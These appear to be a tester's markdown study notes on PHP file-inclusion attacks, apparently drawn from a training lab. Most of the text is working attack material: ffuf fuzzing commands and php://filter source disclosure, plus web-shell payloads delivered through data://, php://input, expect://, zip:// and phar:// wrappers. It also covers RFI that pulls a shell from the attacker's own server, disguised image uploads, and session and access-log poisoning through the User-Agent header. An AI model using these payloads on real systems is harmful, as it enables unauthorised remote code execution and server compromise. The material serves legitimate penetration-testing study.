# Local file inclusion
## PHP filter

The interesting part, is to find first the php files with ffuf

    ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php

after that we can try to retrieve the code using the filters.

    php://filter/read=convert.base64-encode/resource=config


## PHP wrappers
### DATA

the data wrapper is what allows to include external data, including php code, and it can allow us to have an RCE.

first we check the php configurations:

Nginx `/etc/php/X.Y/fpm/php.ini`

Apache `/etc/php/X.Y/apache2/php.ini`

and we check for the parameter `allow_url_include` it has to be on in order to include php code as follows:

    echo '<?php system($_GET["cmd"]); ?>' | base64

    http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id

### input

Similar to data, the only difference that the server needs to accept POST requests.

    curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
           
### Expect

Finally we have the expect, which allows us to run commands directly as follows but before we have to check the configurations and grep expect:

    curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"


## RFI

to locate the RFI, the url needs to be allowed, and to confim that we do the same thing we did before to check the `allow_url_include = On` and try this payload:

    http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php

and to exploit it, we start by writing the web shell

    echo '<?php system($_GET["cmd"]); ?>' > shell.php

we start an http listener with python and launch the payload.

    http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id

it can also be done with ftp, smb, https (maybe not tested)

### File inclusion upload

We can try LFI to upload payloads depending on the situation, example of a set of payloads.

    echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif

and example of calling it as follow: 

    http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id

We can also try a zip upload:

    echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php

    http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id

and we can use the zip wrapper in order to call the payload (warning the wrapper has to be enabled and it doesn't always work)

    http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id

### Phar 

Finally, we can use the phar:// wrapper to achieve a similar result. To do so, we will first write the following PHP script into a shell.php file:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```
This script can be compiled into a phar file that when called would write a web shell to a shell.txt sub-file, which we can interact with. We can compile it into a phar file and rename it to shell.jpg as follows:

```sh
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

and we can call the payload as follow

    http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id

## LOG poisoning my favourite <3
### Sessions

If the app uses sessions, than probably it stores the sessions in `/var/lib/php/sessions/ on Linux and in C:\Windows\Temp\ on Windows. `
if the PHPSESSID cookie is set to el4ukv0kqbvoirg7nkp4dncpk3, then its location on disk would be `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3.`

and now try the LFI using the sessions:

    http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd

it does exist, and now we have to load the payload

    http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E

final step is to execute the shell

    http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id

## Server Log Poisoning

Both Apache and Nginx maintain various log files, such as access.log and error.log. The access.log file contains various information about all requests made to the server, including each request's User-Agent header. As we can control the User-Agent header in our requests, we can use it to poison the server logs as we did above. (src : htb academy)

So, let's try including the Apache access log from /var/log/apache2/access.log, and see what we get the etc/password

in burp suite or curl, we change the user agent to the payload and execute another request.

    curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"

and next, we should execute normal curl with the fli to `/var/log/apache2/access.log` and add the `&cmd=id`

of i can directlyy write the bash command without the cmd : example

     curl -s http://94.237.59.180:46754/index.php -A "<?php system('id'); ?>"

and then just access the log page

Finally, there are other similar log poisoning techniques that we may utilize on various system logs, depending on which logs we have read access over. The following are some of the service logs we may be able to read:

    /var/log/sshd.log
    /var/log/mail
    /var/log/vsftpd.log

## FUZZING 
parameters : 

    ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287

lfi wordlist!

    ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
or just use `LFI-Jhaddix.txt`

Server files 

    ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287

Server logs and configurations

    ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
